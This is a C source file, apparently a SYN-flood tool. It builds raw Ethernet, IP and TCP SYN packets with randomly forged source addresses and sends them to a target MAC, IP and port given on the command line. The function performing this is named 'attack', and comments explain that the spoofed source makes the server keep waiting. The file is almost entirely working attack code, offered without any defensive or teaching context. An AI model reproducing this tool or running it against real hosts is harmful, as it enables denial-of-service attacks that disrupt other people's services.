#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <linux/tcp.h>

#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <linux/sockios.h>

unsigned csum_tcpudp_nofold(unsigned saddr, unsigned daddr,
			unsigned len, unsigned proto, unsigned sum)
{
	unsigned long long s = (unsigned)sum;
	s += (unsigned)saddr;
	s += (unsigned)daddr;
	s += (proto + len) << 8;
	s += (s >> 32);
	return (unsigned)s;
}

unsigned short check_sum(unsigned short *addr, int len, unsigned sum)
{
	int nleft = len;
	unsigned short *w = addr;
	unsigned short ret = 0;
	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}
	if (nleft == 1) {
		*(unsigned char *)(&ret) = *(unsigned char *)w;
		sum += ret;
	}

	sum = (sum>>16) + (sum&0xffff);
	sum += (sum>>16);
	ret = ~sum;
	return ret;
}

int change(char c)
{
	if (c >= 'a') return c-'a'+10;
	if (c >= 'A') return c-'A'+10;
	return c-'0';
}

//在该函数中构造整个IP报文，最后调用sendto函数将报文发送出去
void attack(int skfd, struct sockaddr_ll *target, char **argv)
{
	char buf[512]={0};
	struct ethhdr *eth;
	struct ip *ip;
	struct tcphdr *tcp;
	int pks_len;
	int i;
	int op_len = 12;
	unsigned short dstport;
	dstport = atoi(argv[3]);

	//在我们TCP的报文中Data没有字段，所以整个IP报文的长度
	pks_len = sizeof(struct ethhdr) + sizeof(struct ip) + sizeof(struct tcphdr) + op_len;
	eth = (struct ethhdr *) buf;
	/*
	eth->h_dest[0] = 0x00;
	eth->h_dest[1] = 0x50;
	eth->h_dest[2] = 0x56;
	eth->h_dest[3] = 0xee;
	eth->h_dest[4] = 0x14;
	eth->h_dest[5] = 0xa6;
	*/

	for (i=0;i<6;i++)
		eth->h_dest[i] = change(argv[1][i*3])*16 + change(argv[1][i*3+1]);

	/*
	eth->h_source[0] = 0x00;
	eth->h_source[1] = 0x0b;
	eth->h_source[2] = 0x28;
	eth->h_source[3] = 0xd7;
	eth->h_source[4] = 0x26;
	eth->h_source[5] = 0xa6;
	*/
	eth->h_proto = ntohs(ETH_P_IP);

	//开始填充IP首部
	ip=(struct ip*)(buf + sizeof(struct ethhdr));
	ip->ip_v = IPVERSION;
	ip->ip_hl = sizeof(struct ip) >> 2;
	ip->ip_tos = 0;
	ip->ip_len = htons(pks_len - sizeof(struct ethhdr));
	ip->ip_id = 0;
	ip->ip_off = 0;
	ip->ip_ttl = MAXTTL;
	ip->ip_p = IPPROTO_TCP;
	ip->ip_sum = 0;
	ip->ip_dst.s_addr = inet_addr(argv[2]);

	//开始填充TCP首部
	srand(time(NULL));
	tcp = (struct tcphdr*)(buf + sizeof(struct ethhdr) + sizeof(struct ip));
	tcp->source = random()%50000+10000;
	tcp->dest = ntohs(dstport);
	tcp->seq = random();
	tcp->doff = (sizeof(struct tcphdr) + op_len) >> 2;
	tcp->syn = 1;
	tcp->check = 0;
	tcp->window = ntohs(14600);

	i = pks_len - op_len;
	// mss = 1460
	buf[i++] = 0x02;
	buf[i++] = 0x04;
	buf[i++] = 0x05;
	buf[i++] = 0xb4;
	// sack
	buf[i++] = 0x01;
	buf[i++] = 0x01;
	buf[i++] = 0x04;
	buf[i++] = 0x02;
	// wsscale = 7
	buf[i++] = 0x01;
	buf[i++] = 0x03;
	buf[i++] = 0x03;
	buf[i++] = 0x07;

	int T = 1;
	while(1) {
		if (T == 0) break;
		T--;
		//源地址伪造，我们随便任意生成个地址，让服务器一直等待下去
		ip->ip_src.s_addr = random();
		//自定义源地址192.168.204.136 => 0xc0a8cc88
		//ip->ip_src.s_addr = 0x8fcca8c0;
		unsigned sum = csum_tcpudp_nofold(ip->ip_src.s_addr, ip->ip_dst.s_addr, sizeof(struct tcphdr)+op_len, IPPROTO_TCP, 0);
		tcp->check = check_sum((unsigned short*)tcp, sizeof(struct tcphdr)+op_len, sum);
		ip->ip_sum = check_sum((unsigned short*)ip, sizeof(struct ip), 0);
		sendto(skfd, buf, pks_len, 0, (struct sockaddr*)target, sizeof(struct sockaddr_ll));
	}
}

int main(int argc, char** argv)
{
	int skfd;
	struct sockaddr_ll target;
	struct hostent *host;
	const int on=1;

	if (argc != 4) {
		printf("Usage:%s dstmac dstip dstport\n", argv[0]);
		exit(1);
	}
	if (strlen(argv[1]) != 17) {
		printf("Usage: dstmac must be xx:xx:xx:xx:xx:xx\n");
		exit(1);
	}

	//将协议字段置为IPPROTO_TCP，来创建一个TCP的原始套接字
	if (0 > (skfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP)))) {
		perror("Create Error");
		exit(1);
	}

	// mac
	bzero(&target, sizeof(struct sockaddr_ll));

	struct ifreq ifr;
	strncpy(ifr.ifr_name, "eth0", IFNAMSIZ);
	ioctl(skfd, SIOCGIFINDEX, &ifr);
	target.sll_ifindex = ifr.ifr_ifindex;
	/*
	target.sll_family = AF_PACKET;
	target.sll_protocol = ntohs(80);
	target.sll_hatype = ARPHRD_ETHER;
	target.sll_pkttype = PACKET_OTHERHOST;
	target.sll_halen = ETH_ALEN;
	memset(target.sll_addr,0,8);
	target.sll_addr[0] = 0x00;
	target.sll_addr[1] = 0x0C;
	target.sll_addr[2] = 0x29;
	target.sll_addr[3] = 0x61;
	target.sll_addr[4] = 0xB6;
	target.sll_addr[5] = 0x43;
	*/


	/*
	//http://blog.chinaunix.net/uid-305141-id-2133781.html
	struct sockaddr_ll sll;
	struct ifreq ifstruct;
	memset (&sll, 0, sizeof (sll));
	sll.sll_family = PF_PACKET;
	sll.sll_protocol = htons (ETH_P_IP);

	strcpy (ifstruct.ifr_name, "eth0");
	ioctl (skfd, SIOCGIFINDEX, &ifstruct);
	sll.sll_ifindex = ifstruct.ifr_ifindex;

	strcpy (ifstruct.ifr_name, "eth0");
	ioctl (skfd, SIOCGIFHWADDR, &ifstruct);
	memcpy (sll.sll_addr, ifstruct.ifr_ifru.ifru_hwaddr.sa_data, ETH_ALEN);
	sll.sll_halen = ETH_ALEN;

	if (bind (skfd, (struct sockaddr *) &sll, sizeof (sll)) == -1) {
		printf ("bind:   ERROR\n");
		return -1;
	}

	memset(&ifstruct, 0, sizeof(ifstruct));
	strcpy (ifstruct.ifr_name, "eth0");
	if (ioctl (skfd, SIOCGIFFLAGS, &ifstruct) == -1) {
		perror ("iotcl()\n");
		printf ("Fun:%s Line:%d\n", __func__, __LINE__);
		return -1;
	}

	ifstruct.ifr_flags |= IFF_PROMISC;

	if(ioctl(skfd, SIOCSIFFLAGS, &ifstruct) == -1) {
		perror("iotcl()\n");
		printf ("Fun:%s Line:%d\n", __func__, __LINE__);
		return -1;
	} 
*/
	//因为只有root用户才可以play with raw socket :)
	setuid(getpid());
//    attack(skfd, &sll, srcport);
	attack(skfd, &target, argv);
}